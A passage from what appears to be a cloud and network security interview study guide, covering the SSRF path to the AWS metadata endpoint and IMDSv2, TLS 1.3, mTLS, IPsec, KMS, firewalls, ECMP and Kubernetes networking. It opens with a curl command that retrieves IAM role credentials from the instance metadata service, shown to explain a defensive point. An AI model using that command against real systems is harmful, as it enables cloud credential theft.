curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
# Returns: AccessKeyId, SecretAccessKey, Token — no auth required
```

**SSRF Attack Path (IMDSv1):**
1. Attacker finds SSRF vulnerability in a web application (e.g., `?url=http://169.254.169.254/...`).
2. Server fetches the URL internally.
3. Response contains IAM role credentials.
4. Attacker uses credentials to access AWS APIs.

**Real-world example:** Capital One breach (2019) — WAF misconfiguration + SSRF → IMDSv1 → IAM credentials → S3 data exfiltration.

**IMDSv2 (session-oriented):**
Requires a PUT request to obtain a session token (TTL 1–21600 seconds), then the token must be included in subsequent GET requests:
```bash
# Step 1: Get token (PUT request — SSRF typically can't do PUT)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
```

**Why SSRF can't exploit IMDSv2:**
1. **PUT method** — most SSRF vulnerabilities use HTTP GET (or follow redirects using GET). The initial PUT for token acquisition requires explicit PUT support in the SSRF vector.
2. **Hop-limit = 1** — IMDSv2 checks the TTL of the IP packet. Requests proxied through a layer (container → host IMDS via NAT) decrement TTL below 1 and are rejected. Set `--http-put-response-hop-limit 1` to enforce.
3. **Redirect protection** — IMDSv2 doesn't follow redirects for the token acquisition PUT.

**Enforcement:**
```bash
# Enforce IMDSv2 at instance launch or via EC2 API
aws ec2 modify-instance-metadata-options \
  --instance-id i-0abc123 \
  --http-tokens required \
  --http-put-response-hop-limit 1

# Enforce via SCP for all instances in org
# Deny RunInstances/ModifyInstanceMetadataOptions unless HttpTokens=required
```

**Residual risk:** Applications that use the AWS SDK automatically use IMDSv2 (SDK v2+). Legacy apps using direct `curl` to IMDSv1 will break when forced to IMDSv2.

---

## Section 4: Encryption in Transit & at Rest

---

### Q16. Explain TLS 1.3 in detail. What changed from TLS 1.2 and why does it matter for security?

**Core Concept:** TLS 1.3 handshake, removed ciphers, 0-RTT security implications.

**Answer:**

**TLS 1.3 (RFC 8446) key improvements:**

**1. Handshake reduction: 1-RTT (from 2-RTT):**
```
TLS 1.2:                          TLS 1.3:
Client → ClientHello              Client → ClientHello + KeyShare
Server → ServerHello              Server → ServerHello + KeyShare + Cert + Finished
Server → Certificate              Client → Finished
Server → ServerHelloDone          [Application data begins]
Client → ClientKeyExchange
Client → ChangeCipherSpec
Client → Finished
Server → ChangeCipherSpec
Server → Finished
```

TLS 1.3 merges the key share into ClientHello, allowing the server to derive the session key from the first message. One round-trip saved.

**2. Mandatory Forward Secrecy:**
TLS 1.3 removes all non-FS cipher suites. RSA key exchange (where the static server private key decrypts the pre-master secret) is eliminated. Only (EC)DHE key exchange is supported. Session keys cannot be retroactively decrypted even if the server's private key is compromised.

**3. Removed Weak Algorithms:**
- No RC4, 3DES, MD5, SHA-1 in TLS 1.3.
- No CBC mode cipher suites (removed POODLE, BEAST attack surface).
- No RSA key exchange.
- No static DH.
- Retained: AES-GCM, AES-CCM, ChaCha20-Poly1305 (all AEAD — Authenticated Encryption with Associated Data).

**4. Encrypted Handshake:**
Server Certificate and most handshake messages are encrypted in TLS 1.3. In TLS 1.2, the Certificate was sent in plaintext (visible to network observers). TLS 1.3 encrypts from ServerHello onward.

**5. 0-RTT (Zero Round-Trip Time Resumption):**
TLS 1.3 supports 0-RTT session resumption using a PSK (Pre-Shared Key) from a previous session. Early data can be sent before the handshake completes.

**Security risk of 0-RTT:** Replay attacks — early data can be replayed by a MitM. Applications must make early data idempotent (read-only requests). Most recommendations: disable 0-RTT for non-idempotent endpoints (POST, state mutations).

**Deployment implications:**
- TLS inspection/DPI appliances break on TLS 1.3 (encrypted handshake prevents certificate inspection). Require re-architecting inspection (eBPF-based, agent-based).
- FIPS 140-2 compliance: TLS 1.3 is FIPS-compatible; ensure your TLS library (BoringSSL, Go crypto/tls) uses approved algorithms.

---

### Q17. How does mTLS work? Implement it from scratch in Go.

**Core Concept:** Mutual TLS — both client and server authenticate via certificates.

**Answer:**

Standard TLS: server presents certificate; client validates it. Client is not authenticated.
mTLS: both server presents certificate and **client presents certificate**; both validate each other.

**Go implementation:**
```go
package main

import (
    "crypto/tls"
    "crypto/x509"
    "fmt"
    "net/http"
    "os"
    "log"
)

// SERVER
func StartMTLSServer() {
    // Load server cert and key
    serverCert, err := tls.LoadX509KeyPair("server.crt", "server.key")
    if err != nil {
        log.Fatal(err)
    }

    // Load CA cert to verify client certificates
    caCert, err := os.ReadFile("ca.crt")
    if err != nil {
        log.Fatal(err)
    }
    caCertPool := x509.NewCertPool()
    caCertPool.AppendCertsFromPEM(caCert)

    tlsConfig := &tls.Config{
        Certificates: []tls.Certificate{serverCert},
        ClientCAs:    caCertPool,
        ClientAuth:   tls.RequireAndVerifyClientCert, // Enforce mTLS
        MinVersion:   tls.VersionTLS13,
        CipherSuites: []uint16{
            tls.TLS_AES_256_GCM_SHA384,
            tls.TLS_CHACHA20_POLY1305_SHA256,
        },
    }

    server := &http.Server{
        Addr:      ":8443",
        TLSConfig: tlsConfig,
        Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            // Extract verified client identity from TLS state
            if len(r.TLS.PeerCertificates) > 0 {
                clientCN := r.TLS.PeerCertificates[0].Subject.CommonName
                fmt.Fprintf(w, "Authenticated client: %s\n", clientCN)
            }
        }),
    }
    log.Fatal(server.ListenAndServeTLS("server.crt", "server.key"))
}

// CLIENT
func MTLSClient() {
    clientCert, err := tls.LoadX509KeyPair("client.crt", "client.key")
    if err != nil {
        log.Fatal(err)
    }

    caCert, err := os.ReadFile("ca.crt")
    if err != nil {
        log.Fatal(err)
    }
    caCertPool := x509.NewCertPool()
    caCertPool.AppendCertsFromPEM(caCert)

    tlsConfig := &tls.Config{
        Certificates: []tls.Certificate{clientCert}, // Present client cert
        RootCAs:      caCertPool,                     // Trust server's CA
        MinVersion:   tls.VersionTLS13,
    }

    client := &http.Client{
        Transport: &http.Transport{TLSClientConfig: tlsConfig},
    }

    resp, err := client.Get("https://localhost:8443/")
    if err != nil {
        log.Fatal(err)
    }
    defer resp.Body.Close()
}
```

**Generate certs for testing:**
```bash
# CA
openssl genrsa -out ca.key 4096
openssl req -x509 -new -nodes -key ca.key -sha256 -days 365 -out ca.crt \
  -subj "/CN=test-ca"

# Server
openssl genrsa -out server.key 2048
openssl req -new -key server.key -out server.csr -subj "/CN=localhost"
openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
  -out server.crt -days 365 -sha256

# Client
openssl genrsa -out client.key 2048
openssl req -new -key client.key -out client.csr -subj "/CN=service-payments"
openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
  -out client.crt -days 365 -sha256
```

**Security considerations:**
- Validate SPIFFE URI SANs, not just CN.
- Implement certificate pinning for high-security endpoints.
- Rotate certs frequently (automate via cert-manager or SPIRE).
- Check certificate revocation: OCSP stapling or CRL.

---

### Q18. Explain IPsec. Compare transport mode vs. tunnel mode. When do you use IKEv2?

**Core Concept:** Network-layer encryption; VPN fundamentals.

**Answer:**

IPsec (IP Security) is a suite of protocols providing authentication, integrity, and confidentiality at the IP layer (L3):

**Core Protocols:**
- **AH (Authentication Header, protocol 51)** — provides integrity and authentication, NO encryption.
- **ESP (Encapsulating Security Payload, protocol 50)** — provides encryption, integrity, and authentication. Used almost exclusively in practice.
- **IKE (Internet Key Exchange)** — negotiates SAs (Security Associations) and manages keying material.

**Transport Mode:**
```
[Original IP Header | ESP Header | TCP/UDP | Payload | ESP Trailer | ESP Auth]
```
- Original IP header is preserved.
- Encrypts only the payload (L4 and above).
- Used for host-to-host communication (e.g., between two servers directly).
- Lower overhead — no new IP header.
- Source and destination IPs are visible to the network.

**Tunnel Mode:**
```
[New IP Header | ESP Header | Original IP Header | TCP/UDP | Payload | ESP Trailer | ESP Auth]
```
- Entire original packet (including IP header) is encrypted inside ESP.
- New outer IP header added.
- Used for **gateway-to-gateway** VPNs (site-to-site), **host-to-gateway** (VPN clients).
- Hides internal IP addressing from the network.

**IKEv2 (RFC 7296):**
IKEv2 is the key exchange protocol used to establish IPsec SAs. Improvements over IKEv1:
- Fewer messages (4 vs. 9 for IKEv1).
- Built-in support for **EAP** authentication (for user authentication in VPN clients).
- **MOBIKE (RFC 4555)** — allows SA migration when the client IP changes (mobile users, DHCP reassignment).
- **Traffic Selector** negotiation is more flexible.
- **DoS protection** — cookie-based anti-clog mechanism.

**Cipher negotiation in IKEv2:**
```
# strongSwan example (ipsec.conf / swanctl.conf)
proposals = aes256gcm128-prfsha384-ecp384
# aes256gcm128 = AES-256-GCM with 128-bit ICV (AEAD)
# prfsha384 = PRF using SHA-384
# ecp384 = ECDH P-384 for key exchange
```

**When to use IKEv2:**
- Site-to-site VPNs between data centers (strongSwan, AWS VGW, Azure VPN GW).
- Road-warrior VPN (mobile clients with EAP-TLS or EAP-MSCHAPv2).
- Kubernetes node-to-node encryption (e.g., Calico with IPsec dataplane).

**Trade-offs vs. WireGuard:**
WireGuard is simpler (fewer lines of code = smaller attack surface), faster handshake, but lacks IKEv2's certificate-based auth flexibility and enterprise CA integration. WireGuard is preferred for new deployments where simplicity is valued; IKEv2 is preferred where FIPS, existing PKI integration, or enterprise compatibility is required.

---

### Q19. How does AWS KMS work under the hood? Explain the key hierarchy and HSM backing.

**Core Concept:** Cloud HSM-backed key management; envelope encryption; key policies.

**Answer:**

**AWS KMS Key Hierarchy:**

```
AWS KMS Hardware Security Module (HSM Cluster)
├── Domain Key (per region, wrapped by HSM master key — never leaves HSM hardware)
│
└── KMS Key (CMK — Customer Managed Key or AWS Managed)
    ├── Key material — generated inside HSM, never exported in plaintext
    └── Key Policy — resource-based policy controlling access
        │
        └── Data Key (generated via GenerateDataKey API)
            ├── Plaintext Data Key — returned to caller, used to encrypt data, then discarded
            └── Encrypted Data Key — encrypted under CMK, stored alongside ciphertext
                      (Envelope Encryption)
```

**Envelope Encryption (the critical concept):**
1. Call `kms:GenerateDataKey` → KMS returns `{PlaintextKey, EncryptedKey}`.
2. Use `PlaintextKey` to encrypt your data locally (e.g., AES-256-GCM).
3. Discard `PlaintextKey` from memory.
4. Store `EncryptedKey` alongside the ciphertext.
5. To decrypt: call `kms:Decrypt(EncryptedKey)` → get `PlaintextKey` → decrypt data.

**Why this matters:** KMS never sees your data. Only the small data key is sent to KMS (not your actual payload). KMS API calls are logged in CloudTrail — every decrypt is auditable.

**HSM Backing:**
KMS uses a fleet of FIPS 140-2 Level 2 validated HSMs. The key material is generated and stored within the HSM. `GenerateDataKey` operations happen inside the HSM; plaintext never leaves the HSM unencrypted.

For FIPS 140-2 Level 3 requirements: use **AWS CloudHSM** (dedicated HSM hardware) or **AWS KMS with Custom Key Store** (backed by CloudHSM cluster).

**Key Policy vs. IAM Policy:**
KMS access requires BOTH key policy and IAM policy to allow (unless the key policy grants the root account, enabling IAM to manage it):
```json
{
  "Effect": "Allow",
  "Principal": {"AWS": "arn:aws:iam::123456789:role/EncryptionRole"},
  "Action": ["kms:Decrypt", "kms:GenerateDataKey"],
  "Resource": "*",
  "Condition": {
    "StringEquals": {
      "kms:ViaService": "s3.us-east-1.amazonaws.com",
      "kms:CallerAccount": "123456789"
    }
  }
}
```

**`kms:ViaService` condition** is critical — restricts key usage to a specific AWS service, preventing exfiltration of encrypted data keys for offline cracking attempts.

**Automatic key rotation:** CMKs support annual automatic rotation. KMS maintains old key versions internally to decrypt old ciphertexts. Rotation generates new key material but the key ID remains the same.

---

### Q20. What is Perfect Forward Secrecy (PFS) and why is it non-negotiable for modern production systems?

**Core Concept:** Ephemeral key exchange; protecting past sessions from future key compromise.

**Answer:**

**Without PFS (RSA key exchange in TLS 1.2):**
1. Server has a long-term RSA private key.
2. Client generates a random pre-master secret, encrypts it with the server's RSA public key.
3. Server decrypts with RSA private key → both derive session key.
4. If an attacker records encrypted traffic today and later compromises the server's RSA private key, they can retroactively decrypt ALL past sessions.

**With PFS (DHE/ECDHE key exchange):**
1. Server and client each generate ephemeral (temporary) DH/ECDH key pairs for each session.
2. They perform Diffie-Hellman key agreement to derive the session key.
3. After the session, the ephemeral private keys are discarded.
4. Even if the server's long-term private key is compromised, past sessions cannot be decrypted — the ephemeral keys are gone.

**Mathematical basis (simplified ECDHE):**
```
Server: generate ephemeral (ks, Ks=ks·G)
Client: generate ephemeral (kc, Kc=kc·G)
Shared secret: S = ks·Kc = kc·Ks = ks·kc·G
```
The discrete logarithm problem makes it computationally infeasible to derive `ks` from `Ks`.

**Implementation in TLS:**
```
TLS 1.2 with PFS: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
TLS 1.3: All cipher suites use ECDHE — PFS is mandatory
```

**Why non-negotiable:**
1. **"Record now, decrypt later" attacks** — nation-state adversaries record encrypted traffic at scale and wait for key compromise or quantum computing advances. PFS protects against this.
2. **NIST guidance** — SP 800-52r2 requires PFS for government systems.
3. **Compliance** — PCI DSS v4.0, HIPAA, SOC 2 expectations increasingly require PFS.
4. **TLS 1.3 mandates it** — if you're on TLS 1.3, you have PFS automatically.

**Cipher configuration:**
```nginx
# nginx — enforce PFS, disable non-PFS ciphers
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305;
ssl_prefer_server_ciphers on;
ssl_ecdh_curve X25519:P-384;
```

---

## Section 5: Firewalls, Security Groups, NACLs

---

### Q21. How does Linux netfilter/iptables work? Explain tables, chains, and traversal order.

**Core Concept:** Linux kernel packet filtering architecture; the foundation of cloud SG implementations.

**Answer:**

Netfilter is the Linux kernel framework for packet filtering, NAT, and connection tracking. iptables is the traditional userspace interface; nftables is the modern replacement.

**Tables and their purpose:**

| Table | Purpose | Priority |
|---|---|---|
| `raw` | Connection tracking bypass, NOTRACK | Highest |
| `mangle` | Packet modification (TTL, TOS, mark) | 2nd |
| `nat` | SNAT, DNAT, MASQUERADE | 3rd |
| `filter` | Accept/drop/reject packets | 4th |
| `security` | SELinux security context marking | 5th (lowest) |

**Built-in Chains:**
- `PREROUTING` — before routing decision.
- `INPUT` — packets destined for local socket.
- `FORWARD` — packets being routed through.
- `OUTPUT` — packets originating from local socket.
- `POSTROUTING` — after routing decision, before wire.

**Packet traversal for incoming packets to local process:**
```
Network → PREROUTING (raw→mangle→nat) → Routing Decision → INPUT (mangle→filter→security) → Socket
```

**Packet traversal for forwarded packets:**
```
Network → PREROUTING (raw→mangle→nat) → Routing Decision → FORWARD (mangle→filter→security) → POSTROUTING (mangle→nat) → Network
```

**Packet traversal for locally generated outbound:**
```
Socket → OUTPUT (raw→mangle→nat→filter→security) → Routing Decision → POSTROUTING (mangle→nat) → Network
```

**Connection tracking integration:**
`nf_conntrack` module maintains state. Rules can match on `--state ESTABLISHED,RELATED` to allow return traffic without explicit rules.

**Example: Stateful firewall with iptables:**
```bash
# Default policy: DROP
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Allow established/related
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Allow SSH from specific source
iptables -A INPUT -s 10.0.0.0/8 -p tcp --dport 22 -m conntrack --ctstate NEW -j ACCEPT

# Allow ICMP
iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT

# Log and drop everything else
iptables -A INPUT -j LOG --log-prefix "DROPPED: "
```

**nftables (modern replacement):**
```nft
table inet filter {
  chain input {
    type filter hook input priority filter; policy drop;
    ct state established,related accept
    iif lo accept
    tcp dport 22 ip saddr 10.0.0.0/8 ct state new accept
    ip protocol icmp accept
    log prefix "dropped: " drop
  }
}
```

**Relevance to cloud:** AWS Security Groups are implemented by the Nitro hypervisor as a form of stateful packet filtering with similar semantics to iptables `filter` table with conntrack. Understanding netfilter helps reason about SG behavior and limitations.

---

### Q22. What is the difference between a NGFW (Next-Generation Firewall) and a traditional firewall? What does "L7 inspection" mean for encrypted traffic?

**Core Concept:** NGFW capabilities, SSL/TLS inspection, and its security and privacy implications.

**Answer:**

**Traditional firewall:** L3/L4 — IP, protocol, port. Stateful connection tracking. No application awareness.

**NGFW adds:**
- **Application Identification (App-ID)** — identifies applications regardless of port (e.g., identifies Slack even if it uses port 443).
- **User-ID** — ties network traffic to specific users (via AD, LDAP, SAML).
- **L7 content inspection** — inspect HTTP URLs, DNS queries, file content.
- **IPS/IDS integration** — signature and behavioral detection.
- **Threat intelligence feeds** — reputation-based blocking.
- **SSL/TLS Inspection** (Deep Packet Inspection) — decrypts, inspects, re-encrypts.

**SSL/TLS Inspection architecture:**
```
Client → [ClientHello] → Firewall (MITM)
Firewall → [New ClientHello] → Origin Server
Origin Server → [Server Cert] → Firewall
Firewall validates origin cert, generates NEW cert signed by its own CA
Firewall → [Firewall-signed Cert] → Client
Client must trust Firewall CA (deployed via GPO/MDM)
```
This is a **deliberate MitM**. The firewall sees plaintext content between client and server.

**Security and privacy implications:**
1. **Breaks PFS** — if the firewall re-signs with a static cert, PFS is broken for client→firewall leg.
2. **Certificate pinning breaks** — apps that pin the server's certificate will reject the firewall's cert.
3. **Privacy concerns** — all user traffic (banking, health, personal) is visible to the firewall operator. Regulatory compliance (HIPAA, GDPR) implications.
4. **New attack surface** — the firewall's TLS implementation becomes a high-value target. Historically, TLS inspection proxies have introduced vulnerabilities (e.g., BlueCoat, Sophos bugs where TLS errors were silently ignored).
5. **TLS 1.3 encrypted handshake** complicates SNI-based inspection.

**Alternatives to inline TLS inspection:**
- **eBPF-based inspection** — hook into kernel TLS (kTLS) or application-level (uprobes on OpenSSL) to inspect plaintext at the application layer without a network-level MitM.
- **Agent-based** — endpoint agent has visibility into plaintext without network inspection.
- **DNS-layer filtering** — block domains at DNS query level (Cisco Umbrella, Cloudflare Gateway).

---

### Q23. How do AWS Security Groups differ from NACLs? Describe a scenario where misconfiguring both creates a vulnerability.

**Core Concept:** Layered security model; stateful vs. stateless interaction; failure mode analysis.

**Answer:**

| Dimension | Security Group | NACL |
|---|---|---|
| **State** | Stateful (conntrack) | Stateless |
| **Applies to** | ENI level | Subnet level |
| **Default behavior** | Deny all inbound, allow all outbound | Allow all (default NACL) |
| **Rules** | Allow only (no explicit deny) | Allow AND deny |
| **Evaluation** | All rules evaluated, most permissive wins | Rules evaluated in order by number (lowest first, first match wins) |
| **Return traffic** | Automatically allowed | Must explicitly allow ephemeral ports |

**Vulnerability Scenario: Defense bypass via NACL misconfiguration:**

Setup:
- Prod DB subnet has NACL with:
  - Rule 100: ALLOW TCP 3306 from 10.0.1.0/24 (app subnet)
  - Rule 200: DENY ALL
- DB Security Group allows TCP 3306 from app SG.

**Dev environment share:** During debugging, a developer adds a NACL rule:
- Rule 90: ALLOW ALL from 0.0.0.0/0 (to "temporarily fix connectivity")

**Result:** Rule 90 (lower number) takes precedence over Rule 100. NACL now allows ALL traffic to the DB subnet from anywhere. The Security Group still provides layer 2 protection, but:
- If the SG allows 0.0.0.0/0 on port 3306 (another mistake), the DB is exposed to the internet.
- **Real scenario:** NACL allows all from 0.0.0.0/0; SG allows 3306 from 0.0.0.0/0 (added "temporarily") = MySQL exposed to internet.

**Another scenario: NACL blocks legitimate return traffic:**
- App in private subnet makes outbound call.
- NACL outbound: ALLOW ALL.
- NACL inbound: ALLOW TCP 443 from 0.0.0.0/0.
- **Missing:** ALLOW TCP 1024-65535 (ephemeral ports) for return traffic.
- Result: TCP SYN goes out, SYN-ACK returns on ephemeral port, NACL blocks it → connection hangs.
- SG (stateful) would have allowed it, but NACL (stateless) blocks.

**Mitigation:**
- Always add NACL inbound rule for ephemeral ports (1024-65535) on private subnets.
- Automate NACL auditing with AWS Config rules.
- Use Terraform/CDK to version-control NACL rules; prevent console-based "temporary" changes.
- Treat NACL as a coarse guardrail, SG as the primary control.

---

## Section 6: BGP, Routing & SDN

---

### Q24. What is Software Defined Networking (SDN)? How do hyperscalers implement it?

**Core Concept:** Control/data plane separation; cloud SDN implementations.

**Answer:**

SDN separates the **control plane** (decides where packets go — routing decisions, policy) from the **data plane** (moves packets according to decisions — ASICs, FPGAs, NICs).

**Traditional networking:** Control and data plane are coupled on each device (switch runs OSPF/BGP and forwards packets).

**SDN model:**
```
Control Plane (Centralized/Distributed Controller)
├── Collects topology from all switches
├── Computes optimal paths (Dijkstra, TE algorithms)
├── Installs forwarding entries via OpenFlow / proprietary protocol
└── Enforces policy

Data Plane (Dumb switches / ASICs / SmartNICs)
└── Executes forwarding decisions from controller
    └── Match → Action tables (TCAM, P4, OpenFlow)
```

**Hyperscaler Implementations:**

**AWS Nitro:**
- Physical servers have a **Nitro card** (custom ARM-based SmartNIC).
- All networking (VPC, EBS, S3) is offloaded to the Nitro card.
- Host CPU is freed for customer workloads.
- Nitro enforces SGs, ENI isolation, VPC encapsulation (VXLAN/Geneve) on the card.
- Control plane: EC2 API → regional controller → pushes config to Nitro cards via internal control protocol.

**GCP Andromeda:**
- Pure software SDN running on commodity servers.
- Andromeda agents on each host handle encapsulation (their custom protocol), routing, and firewall.
- Centralized control plane distributes policy to agents.
- "Hoverboard" mode: some flows handled in specialized network infrastructure (for high-bandwidth flows).

**Azure AccelNet / FPGA:**
- Azure uses **FPGAs** (programmable hardware) in their SmartNIC equivalent.
- FPGAs run the Azure VFP (Virtual Filtering Platform) — a programmable packet processing pipeline.
- Handles SR-IOV, VNet encapsulation, NSG enforcement at hardware speed.
- FPGAs can be reprogrammed without replacing hardware, enabling rapid feature deployment.

**P4 (Programming Protocol-independent Packet Processors):**
A domain-specific language for defining data plane behavior. Enables expressing custom forwarding logic that compiles to ASIC/FPGA/software targets.
```p4
// P4 example: match on destination IP, forward to next-hop
table ipv4_lpm {
  key = { hdr.ipv4.dstAddr: lpm; }
  actions = { forward; drop; }
  size = 1024;
}
```

---

### Q25. Explain ECMP (Equal Cost Multi-Path) routing. What are its failure modes in stateful environments?

**Core Concept:** Load distribution across multiple equal-cost paths; conntrack conflict.

**Answer:**

ECMP distributes traffic across multiple equal-cost paths to the same destination. When multiple routes to a destination have equal metrics, the router uses a hash of packet headers to select a path, distributing load.

**Typical hash inputs:**
- L3: src-IP + dst-IP + protocol
- L4 (recommended): src-IP + dst-IP + src-port + dst-port + protocol (5-tuple)

**Hash-based flow affinity:** Within a single TCP flow (same 5-tuple), all packets hash to the same value → take the same path → in-order delivery guaranteed.

**Failure modes with stateful components:**

1. **Stateful firewall with ECMP:**
   - Flow establishes through NGFW node A (conntrack entry created on A).
   - Return traffic arrives at router; ECMP hash routes it to NGFW node B.
   - Node B has no conntrack entry for this flow → drops the return packet.
   - **Mitigation:** Symmetric ECMP (ensure both directions hash to same path), or stateful clustering (shared conntrack state via DPDK/hardware), or active-passive failover (no ECMP on stateful devices).

2. **Link failure and flow redistribution:**
   - 4 ECMP paths. One link fails → routing reconverges → ECMP re-hashes all flows.
   - All existing flows are rehashed to new paths → all stateful firewalls/NAT lose connection state.
   - **Mitigation:** Fast failover with BFD (Bidirectional Forwarding Detection), plus connection state synchronization.

3. **NAT with ECMP:**
   - SNAT creates a mapping (src-IP:port → NAT-IP:port) on one node.
   - Return traffic arrives at a different NAT node → no mapping → drop.
   - **Mitigation:** Consistent hashing with affinity, or shared NAT state (expensive).

4. **Kubernetes ECMP to Services:**
   - kube-proxy uses iptables with `statistic` module for probabilistic ECMP to pod backends.
   - This creates "sticky" connections per flow but introduces uneven distribution when pod counts change (hash collision).
   - Cilium's eBPF-based load balancing uses Maglev hashing for consistent distribution and handles pod churn better.

---

## Section 7: Kubernetes & Container Networking

---

### Q26. Explain the Kubernetes networking model. What are the 4 core requirements and how does CNI fulfill them?

**Core Concept:** Flat pod network, no NAT, CNI plugin architecture.

**Answer:**

**Kubernetes Networking Model — 4 requirements (from the spec):**

1. **Every pod gets its own IP address.**
2. **All pods can communicate with all other pods without NAT.** (Pod-to-pod: src IP = pod IP, not node IP)
3. **Agents on a node (system daemons, kubelet) can communicate with all pods on that node.**
4. **Pods in the host network of a node can communicate with all pods without NAT.**

These requirements define a "flat" network — no IP masquerading between pods. This simplifies the model but requires the CNI to implement it.

**CNI (Container Network Interface):**
CNI is a specification and library for writing network plugins. When a pod is created:
1. kubelet calls the configured CNI plugin binary (e.g., `/opt/cni/bin/calico`).
2. CNI plugin sets up a network namespace (netns) for the pod.
3. Creates a veth pair: one end in pod netns, one end on the host.
4. Assigns an IP from the pod CIDR to the pod's veth.
5. Sets up routing so the pod IP is reachable.

**How CNI plugins fulfill the requirements:**

**Calico (BGP mode):**
- Each node's pod CIDR is advertised via BGP to the network.
- Pods communicate using real routed IPs — no encapsulation.
- Requires the underlay to route pod CIDRs (BGP peering with ToR switches in bare-metal).

**Flannel (VXLAN mode):**
- Pod packets are encapsulated in VXLAN and sent between nodes.
- VTEP on each node encapsulates/decapsulates.
- Underlay only needs to route node IPs (simpler requirements on underlay).

**Cilium:**
- Uses eBPF programs to implement the network model in the kernel.
- Replaces kube-proxy; handles Service load balancing in eBPF.
- NetworkPolicy enforcement via eBPF (bypass iptables, lower latency, higher throughput).
- Hubble provides L7 flow observability.

**AWS VPC CNI:**
- Assigns actual VPC secondary IPs to pods from ENIs on the node.
- Pod IPs are native VPC IPs — no encapsulation, no overlay.
- Direct routing via VPC routing tables.
- Allows Security Groups to be assigned directly to pods (`SecurityGroupPolicy` CRD).

---

### Q27. What is a Kubernetes NetworkPolicy? Write a production-grade default-deny policy and explain its limitations.

**Core Concept:** Pod-level network segmentation; NetworkPolicy semantics and gaps.

**Answer:**

NetworkPolicy is a Kubernetes API object that specifies how groups of pods can communicate with each other and external endpoints. **Critically: NetworkPolicy is only enforced if the CNI plugin supports it** (Calico, Cilium, Weave — yes; Flannel — no).

**Policy selection:** A NetworkPolicy selects pods via `podSelector`. If a pod is selected by ANY NetworkPolicy in its namespace, that pod is subject to policy. Pods not selected by any policy have no restrictions.

**Default-deny-all (ingress and egress):**
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: payments
spec:
  podSelector: {}        # Selects ALL pods in namespace
  policyTypes:
  - Ingress
  - Egress
  # No ingress/egress rules = deny all traffic
```

**Allow specific communication:**
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-payments-to-inventory
  namespace: payments
spec:
  podSelector:
    matchLabels:
      app: payments-service
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          name: inventory
      podSelector:
        matchLabels:
          app: inventory-service
    ports:
    - protocol: TCP
      port: 8080
  # Allow DNS (required for service discovery)
  - to:
    - namespaceSelector: {}
    ports:
    - protocol: UDP
      port: 53
```

**Critical limitations of Kubernetes NetworkPolicy:**

1. **No L7 policy** — NetworkPolicy is L3/L4 only (IP, port, protocol). Cannot express "allow GET /api/v1 but deny POST /admin". Requires Cilium L7 policy or service mesh (Istio AuthorizationPolicy) for L7.

2. **No FQDN/egress-by-hostname** — cannot write "allow egress to api.example.com". Only IP CIDR blocks for external egress. Cilium's `CiliumNetworkPolicy` adds FQDN selectors.

3. **No node-level isolation** — NetworkPolicy applies to pods. DaemonSet pods or host-networked pods may bypass it depending on CNI implementation.

4. **Namespace label trust** — `namespaceSelector` relies on namespace labels. Any user who can label namespaces can potentially bypass policies. Use admission controllers to protect label manipulation.

5. **CNI-dependent enforcement** — if you change CNI plugins, policy enforcement changes. Validate policy enforcement explicitly.

6. **No audit logging** — NetworkPolicy doesn't log denied connections by default. Cilium's Hubble provides this; Calico has flow logs.

---

### Q28. How does Cilium's eBPF-based networking differ from traditional iptables-based kube-proxy? What are the security advantages?

**Core Concept:** eBPF datapath vs. iptables; performance, security, and observability differences.

**Answer:**

**kube-proxy (iptables mode):**
- Creates iptables rules for every Service and Endpoint.
- Packet destined for ClusterIP hits `PREROUTING` → DNAT chain → random pod selection via `statistic` module.
- For 10,000 services × N endpoints = potentially hundreds of thousands of iptables rules.
- iptables is O(n) rule evaluation (linear scan, no hash lookup for complex rules).
- Rule updates require flushing and reloading — O(n) operations on every endpoint change.

**Cilium eBPF:**
- eBPF programs attached to tc (traffic control) hooks process packets in the kernel.
- Service endpoints stored in eBPF hash maps (O(1) lookup).
- Maglev consistent hashing for stable backend selection during backend churn.
- Policy enforced via eBPF programs attached to each pod's network interface.
- kube-proxy is completely replaced (no iptables rules for services).

**Performance comparison:**
```
At 10k services, 10 endpoints each:
iptables: ~100k rules, rule update ~5-10 seconds (full reload)
eBPF:     O(1) hash map lookup, update in microseconds
```

**Security advantages of Cilium/eBPF:**

1. **L7 policy enforcement:** Cilium can enforce HTTP method/path, gRPC method, Kafka topic-level policies without a sidecar proxy:
   ```yaml
   # Cilium L7 policy
   apiVersion: cilium.io/v2
   kind: CiliumNetworkPolicy
   spec:
     endpointSelector:
       matchLabels: {app: api-server}
     ingress:
     - fromEndpoints:
       - matchLabels: {app: frontend}
       toPorts:
       - ports: [{port: "80", protocol: TCP}]
         rules:
           http:
           - method: GET
             path: /api/v1/.*
   ```

2. **Identity-based (not IP-based):** Cilium assigns a numeric security identity to each workload based on labels. Policy is enforced by identity, not IP. IP address changes (pod restart) don't require policy updates.

3. **Kernel bypass prevention:** eBPF programs run in the kernel and cannot be bypassed by userspace (unlike iptables, which a privileged container could manipulate).

4. **Transparent encryption:** Cilium supports node-to-node WireGuard encryption — all pod traffic is encrypted at the node level without application changes.

5. **Hubble observability:** L7 flow visibility with identity context — see which service called which, with HTTP method, status code, latency — without modifying applications.

---

### Q29. Explain Kubernetes Service types: ClusterIP, NodePort, LoadBalancer, ExternalName. What are the security implications of each?

**Core Concept:** Service networking internals; exposure surface per service type.

